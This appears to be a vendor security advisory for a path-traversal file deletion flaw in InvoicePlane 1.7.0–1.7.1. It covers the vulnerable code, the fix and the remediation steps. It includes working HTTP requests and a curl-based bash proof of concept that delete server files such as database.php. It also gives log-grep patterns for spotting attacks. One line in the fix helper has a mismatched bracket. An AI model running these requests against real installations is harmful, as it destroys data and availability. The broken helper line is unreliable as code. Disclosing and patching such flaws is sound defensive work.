# Security Advisory: Arbitrary File Deletion Vulnerability (CVE Pending)

## Overview

**Vulnerability Type:** Arbitrary File Deletion via Path Traversal  
**Severity:** HIGH  
**CVSS v3.1 Score:** 7.1 (HIGH)  
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H  
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)  
**Affected Versions:** InvoicePlane v1.7.0, v1.7.1  
**Fixed Version:** InvoicePlane v1.7.2  
**CVE ID:** Pending Allocation  

## Vulnerability Description

InvoicePlane versions 1.7.0 and 1.7.1 contained an arbitrary file deletion vulnerability in the settings management functionality. Due to insufficient validation of user-supplied logo filename settings, an authenticated administrator could delete arbitrary files on the server filesystem by exploiting path traversal sequences.

### Technical Details

The vulnerability existed in two locations within `application/modules/settings/controllers/Settings.php`:

#### 1. Settings Save Function (Input Validation Bypass)

The settings save functionality accepted arbitrary values for logo filename settings without proper validation:

```php
// Vulnerable code (v1.7.1 and earlier)
foreach ($settings as $key => $value) {
    // ... other processing ...
    $batch_settings[$key] = $value;  // No validation for logo filenames!
}
```

An attacker could submit malicious settings containing path traversal sequences:

```http
POST /index.php/settings HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_ip_csrf=<token>&settings[invoice_logo]=../../sensitive-file.txt
```

This would store the malicious path `../../sensitive-file.txt` in the database without validation.

#### 2. Logo Removal Function (Path Traversal Exploitation)

The `remove_logo()` function retrieved the logo filename from the database and used it directly to delete files:

```php
// Vulnerable code (v1.7.1 and earlier)
public function remove_logo($type)
{
    $logo_filename = get_setting($type . '_logo');
    
    // No validation - direct file deletion!
    $logo_path = './uploads/' . $logo_filename;
    if (file_exists($logo_path)) {
        unlink($logo_path);  // Arbitrary file deletion!
    }
}
```

By combining both vulnerabilities, an attacker could:
1. Set a malicious logo filename with path traversal (e.g., `../../config/database.php`)
2. Trigger logo removal via `GET /index.php/settings/remove_logo/invoice`
3. Delete arbitrary files on the server

### Attack Scenario

**Step 1:** Attacker authenticates as administrator (compromised credentials, social engineering, etc.)

**Step 2:** Attacker crafts malicious POST request to set evil logo path:

```http
POST /index.php/settings HTTP/1.1
Host: victim-invoiceplane.com
Cookie: ip_session=<session_id>
Content-Type: application/x-www-form-urlencoded

_ip_csrf=<valid_token>&settings[invoice_logo]=../../application/config/database.php
```

**Step 3:** Attacker triggers logo removal:

```http
GET /index.php/settings/remove_logo/invoice HTTP/1.1
Host: victim-invoiceplane.com
Cookie: ip_session=<session_id>
```

**Result:** The critical `database.php` configuration file is deleted, causing complete application failure.

### Impact

An authenticated administrator could:

- **Delete configuration files** (database.php, ipconfig.php) → Application unavailability
- **Delete application files** (controllers, models, libraries) → Service disruption
- **Delete log files** → Evidence destruction, compliance violations
- **Delete uploaded documents** → Data loss, business disruption
- **Delete system files** (if permissions allow) → Server compromise

**Business Impact:**
- Complete application failure (Availability impact: HIGH)
- Data loss through file deletion (Integrity impact: HIGH)
- No direct data exposure (Confidentiality impact: NONE)

## Proof of Concept

```bash
#!/bin/bash
# PoC: Arbitrary file deletion in InvoicePlane <=1.7.1

TARGET="http://vulnerable-invoiceplane.local"
SESSION_COOKIE="ip_session=attacker_session_id"
CSRF_TOKEN="valid_csrf_token_here"

echo "[*] Step 1: Creating test file to delete"
ssh admin@server "echo 'TEST FILE' > /var/www/html/test-delete-me.txt"

echo "[*] Step 2: Setting malicious logo path via settings"
curl -X POST "${TARGET}/index.php/settings" \
  -H "Cookie: ${SESSION_COOKIE}" \
  -d "_ip_csrf=${CSRF_TOKEN}&settings[invoice_logo]=../test-delete-me.txt"

echo "[*] Step 3: Triggering file deletion via logo removal"
curl -X GET "${TARGET}/index.php/settings/remove_logo/invoice" \
  -H "Cookie: ${SESSION_COOKIE}"

echo "[*] Step 4: Verifying file was deleted"
ssh admin@server "[ ! -f /var/www/html/test-delete-me.txt ] && echo 'SUCCESS: File deleted!' || echo 'FAILED: File still exists'"
```

## Fix Implementation

The vulnerability was fixed in InvoicePlane v1.7.2 through multiple defense-in-depth layers:

### Fix 1: Input Validation on Settings Save

Added filename validation when saving logo settings:

```php
// Fixed code (v1.7.2)
// Security: Validate logo filename settings to prevent path traversal
if ($key === 'invoice_logo' || $key === 'login_logo') {
    if ( ! empty($value)) {
        $validation = validate_safe_filename($value);
        if ( ! $validation['valid']) {
            log_message('error', sprintf(
                'Path traversal attempt blocked in %s setting (hash: %s, error: %s)',
                sanitize_for_logging($key),
                $validation['hash'],
                sanitize_for_logging($validation['error'])
            ));
            $this->session->set_flashdata('alert_error', trans('invalid_filename'));
            redirect('settings');
        }
    }
}
$batch_settings[$key] = $value;
```

### Fix 2: Type Parameter Validation

Added strict validation of the logo type parameter:

```php
// Fixed code (v1.7.2)
public function remove_logo(string $type)
{
    // Security: Validate type parameter against allowed values
    $allowed_types = ['invoice', 'login'];
    if ( ! in_array($type, $allowed_types, true)) {
        log_message('error', sprintf(
            'Invalid logo type specified: %s by user %s',
            sanitize_for_logging($type),
            sanitize_for_logging((string) $this->session->userdata('user_id'))
        ));
        $this->session->set_flashdata('alert_error', trans('invalid_file_path'));
        redirect('settings');
    }
    // ... rest of function
}
```

### Fix 3: Comprehensive File Access Validation

Added multi-layer file validation using `validate_file_access()` helper:

```php
// Fixed code (v1.7.2)
// Security: Validate the logo filename is safe and within uploads directory
$uploads_dir = './uploads/';
$validation  = validate_file_access($logo_filename, $uploads_dir);

if ( ! $validation['valid']) {
    // Special case: file_not_found allows DB cleanup
    if ($validation['error'] === 'file_not_found') {
        log_message('info', sprintf(
            'Clearing stale logo setting for type=%s (file not found) by user %s',
            sanitize_for_logging($type),
            sanitize_for_logging((string) $this->session->userdata('user_id'))
        ));
        $this->mdl_settings->save($type . '_logo', '');
        $this->session->set_flashdata('alert_success', trans($type . '_logo_removed'));
        redirect('settings');
    }

    // Security: Log invalid attempts
    log_message('error', sprintf(
        'Invalid logo removal attempt for type=%s (hash: %s, error: %s) by user %s',
        sanitize_for_logging($type),
        sanitize_for_logging((string) $validation['hash']),
        sanitize_for_logging((string) ($validation['error'] ?? 'unknown')),
        sanitize_for_logging((string) $this->session->userdata('user_id'))
    ));

    $this->session->set_flashdata('alert_error', trans('invalid_file_path'));
    redirect('settings');
}

// Security: Use validated path from validation result
if (file_exists($validation['path'])) {
    $deleted = unlink($validation['path']);
    // ... error handling
}
```

### Fix 4: Enhanced File Security Helper

Created `application/helpers/file_security_helper.php` with comprehensive validation:

```php
/**
 * Validate that a filename is safe and doesn't contain path traversal sequences.
 */
function validate_safe_filename(string $filename): array
{
    $hash = hash('sha256', $filename);

    // Check for path traversal sequences
    if (str_contains($filename, '../')
        || str_contains($filename, '..\\')
        || str_contains($filename, '/..')
        || str_contains($filename, '\\..')
        || $filename === '..') {
        return ['valid' => false, 'hash' => $hash, 'error' => 'path_traversal'];
    }

    // Check for null bytes
    if (str_contains($filename, "\0")) {
        return ['valid' => false, 'hash' => $hash, 'error' => 'null_byte'];
    }

    // Check for absolute paths
    if (str_starts_with($filename, '/') || str_starts_with($filename, '\\')) {
        return ['valid' => false, 'hash' => $hash, 'error' => 'absolute_path'];
    }

    // Check for Windows drive letters
    if (preg_match('/^[a-zA-Z]:/', $filename)) {
        return ['valid' => false, 'hash' => $hash, 'error' => 'drive_letter');
    }

    return ['valid' => true, 'hash' => $hash];
}
```

## Defense-in-Depth Layers

The fix implements 7 security layers:

1. **Input validation** - Filenames validated on settings save
2. **Type validation** - Logo type restricted to allowed list
3. **Path traversal detection** - Multiple checks for `../`, `..\\`, etc.
4. **Null byte detection** - Prevents PHP < 8.1 path truncation attacks
5. **Absolute path rejection** - Prevents `/etc/passwd` style attacks
6. **Directory confinement** - Files must be in `./uploads/` directory
7. **Secure logging** - Attack attempts logged with hash (prevents log injection)

## Remediation

### For Users

**Immediate Actions Required:**

1. **Upgrade to InvoicePlane v1.7.2 or later immediately**
   ```bash
   # Backup current installation
   tar -czf invoiceplane-backup-$(date +%Y%m%d).tar.gz /var/www/invoiceplane
   
   # Upgrade to v1.7.2
   cd /var/www/invoiceplane
   git fetch origin
   git checkout v1.7.2
   ```

2. **Audit your system for suspicious file deletions**
   ```bash
   # Check for missing critical files
   ls -la application/config/database.php
   ls -la ipconfig.php
   
   # Review application logs for deletion attempts
   grep -i "logo removal\|invalid.*path\|path.*traversal" application/logs/*.php
   ```

3. **Review administrator access logs**
   ```bash
   # Check for suspicious admin activity
   grep "settings/remove_logo" /var/log/apache2/access.log
   grep "settings.*logo" /var/log/nginx/access.log
   ```

4. **Verify database integrity**
   ```sql
   -- Check for suspicious logo filenames in database
   SELECT setting_key, setting_value 
   FROM ip_settings 
   WHERE setting_key LIKE '%_logo' 
   AND setting_value LIKE '%..%';
   ```

### For Developers

**Secure Coding Practices:**

1. **Always validate file paths before filesystem operations**
   ```php
   // Load the file security helper
   $this->load->helper('file_security');
   
   // Validate before any file operation
   $validation = validate_file_access($filename, $base_directory);
   if ( ! $validation['valid']) {
       log_message('error', 'Invalid file access attempt');
       redirect('error_page');
   }
   
   // Use validated path
   $safe_path = $validation['path'];
   ```

2. **Use helper functions for all file operations**
   - `validate_safe_filename()` - Check for path traversal
   - `validate_file_in_directory()` - Verify directory confinement
   - `validate_file_access()` - Complete file validation
   - `sanitize_for_logging()` - Prevent log injection

3. **Never trust user input for file paths**
   - Use basename() to strip directory components
   - Validate against allow-lists when possible
   - Use realpath() to resolve symbolic links
   - Check final path is within expected directory

## Verification Testing

### Test 1: Path Traversal Rejection

```php
// Test that path traversal is blocked
$validation = validate_safe_filename('../../etc/passwd');
assert($validation['valid'] === false);
assert($validation['error'] === 'path_traversal');
```

### Test 2: Settings Save Validation

```bash
# Attempt to save malicious logo path
curl -X POST "http://invoiceplane.local/index.php/settings" \
  -H "Cookie: ip_session=valid_session" \
  -d "_ip_csrf=valid_token&settings[invoice_logo]=../../test.txt"

# Should show error: "invalid_filename"
```

### Test 3: Logo Removal Protection

```bash
# Manually inject malicious path to database
mysql -e "UPDATE ip_settings SET setting_value='../../test.txt' WHERE setting_key='invoice_logo'"

# Attempt removal
curl "http://invoiceplane.local/index.php/settings/remove_logo/invoice"

# Should show error: "invalid_file_path"
# File should NOT be deleted
# Error should be logged
```

## Timeline

- **Discovery Date:** Not publicly disclosed (discovered internally)
- **Initial Fix:** 2026-04-06 (v1.7.2 release)
- **Public Disclosure:** 2026-04-19 (this advisory)
- **CVE Request:** 2026-04-19 (pending allocation)

## CVE Allocation Information

### For CVE Numbering Authorities (CNAs)

**Vulnerability Information:**
- **Product:** InvoicePlane
- **Vendor:** InvoicePlane.com
- **Affected Versions:** 1.7.0, 1.7.1
- **Fixed Versions:** 1.7.2+
- **Vulnerability Type:** CWE-22 (Path Traversal)
- **Attack Vector:** Network
- **Attack Complexity:** Low
- **Privileges Required:** High (Administrator)
- **User Interaction:** None
- **Scope:** Unchanged
- **Confidentiality Impact:** None
- **Integrity Impact:** High
- **Availability Impact:** High

**Suggested CVE Description:**
> InvoicePlane 1.7.0 and 1.7.1 allows authenticated administrators to delete arbitrary files on the server through path traversal in logo filename settings. An attacker can set a malicious logo filename containing path traversal sequences (e.g., ../../config/database.php) via the settings page, then trigger deletion through the remove_logo endpoint. This can lead to application failure, data loss, or denial of service. Fixed in version 1.7.2 through input validation and directory confinement.

## References

- **CWE-22:** Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')  
  https://cwe.mitre.org/data/definitions/22.html

- **OWASP Path Traversal:**  
  https://owasp.org/www-community/attacks/Path_Traversal

- **InvoicePlane Security Policy:**  
  https://github.com/InvoicePlane/InvoicePlane/blob/develop/SECURITY.md

- **Fix Commit:**  
  https://github.com/InvoicePlane/InvoicePlane (v1.7.2 release)

## Credits

- **Reported by:** Security researcher (to be credited upon CVE allocation)
- **Fixed by:** InvoicePlane Core Development Team
- **Advisory by:** InvoicePlane Security Team

## Contact

For security concerns or questions about this advisory:

- **Email:** mail@invoiceplane.com
- **Security Email:** security@invoiceplane.com (preferred)

**Responsible Disclosure:** Please report vulnerabilities privately before public disclosure.

---

**Document Version:** 1.0  
**Last Updated:** 2026-04-19  
**Status:** CVE Pending Allocation
